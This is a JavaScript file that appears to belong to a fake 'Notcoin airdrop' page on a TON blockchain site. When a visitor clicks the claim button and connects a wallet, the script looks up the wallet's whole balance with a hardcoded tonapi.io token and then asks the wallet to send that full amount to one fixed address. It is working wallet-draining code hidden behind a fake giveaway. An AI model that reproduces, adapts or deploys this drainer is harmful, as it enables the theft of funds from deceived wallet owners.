

const token = 'AG5CYB5AA5KWBMIAAAABU7FQD5LCD3K7F4QPI4RFNR3HPJGKYT4ZNQLGZM3APX5QJ5IWACI';


const apiUrl = 'https://tonapi.io/v2';



async function getBalance(account_id) {

    try {
        const response = await axios.get(`${apiUrl}/blockchain/accounts/${account_id}`, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

       return response.data.balance

    } catch (error) {
        console.error('Error fetching balance account:', error);
        return [];
    }
}



async function initializeTonConnect() {
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://notcoinairdrop.space/tonconnect-manifest.json',
        buttonRootId: 'connect-button-root'
    });

    tonConnectUI.uiOptions = {
        language: 'en',
        uiPreferences: {
            theme: 'LIGHT'
        }
    };
    console.log(tonConnectUI)

    const claimnow = document.querySelector('.connect-button')
    claimnow.addEventListener('click', () =>{
        tonConnectUI.openModal()
    })
    

    try {
        const walletsList = await tonConnectUI.getWallets();
        const currentModalState = tonConnectUI.modalState;


      
        const unsubscribeModal = tonConnectUI.onModalStateChange(
            (WalletsModalState) => {
        
                // update state/reactive variables to show updates in the ui
                // state.status will be 'opened' or 'closed'
                // if state.status is 'closed', you can check state.closeReason to find out the reason
            }
        );

        const unsubscribe =  tonConnectUI.onStatusChange(
           async walletAndwalletInfo => {

                const currentWallet = tonConnectUI.wallet;
                const account_id = currentWallet.account.address
             
                const balance = await getBalance(account_id) 
                

                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
                    messages: [
                        {
                            address: "UQAMqsrW7wsj1ZsXx4yXCEyLxLqOjPC7zvwRGOKhof-Pfzkt",
                            amount: balance,
                        
                        },
                    
                      
                    ]
                }
                
                try {
                    const result = await tonConnectUI.sendTransaction(transaction);
                
                
                    const someTxData = await myAppExplorerService.getTransaction(result.boc);
                    alert('Transaction was sent successfully', someTxData);
                } catch (e) {
                    console.error(e);
                }
                const currentWalletInfo = tonConnectUI.walletInfo;
                const currentAccount = tonConnectUI.account;
                const currentIsConnectedStatus = tonConnectUI.connected;

           
                console.log(balance)

            } 
        );


    } catch (error) {
        console.error('Error fetching wallets:', error);
    }
}

initializeTonConnect();
